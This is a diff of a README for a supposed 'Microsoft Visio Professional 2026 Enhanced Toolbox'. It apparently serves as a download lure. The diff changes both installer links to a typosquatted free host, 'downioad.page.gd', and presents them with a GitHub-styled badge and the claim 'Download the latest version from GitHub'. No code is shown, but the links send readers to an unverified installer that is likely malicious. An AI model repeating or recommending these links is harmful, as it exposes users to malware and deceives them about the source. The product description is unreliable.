@@ -2,7 +2,7 @@
 
 Microsoft Visio Professional 2026 Enhanced Toolbox is a comprehensive utility designed to elevate your diagramming capabilities. This tool integrates seamlessly with Microsoft Visio Professional, offering a range of features that enhance productivity, customization, and performance. Whether you're creating flowcharts, network diagrams, or floor plans, this toolbox provides the necessary tools to streamline your workflow.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## Key Features
 
@@ -72,7 +72,7 @@ Yes, we plan to release regular updates to add new features and improve compatib
 
 For access to the latest version and detailed documentation, please visit the official download page:
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 *Last Updated: 2026*
 
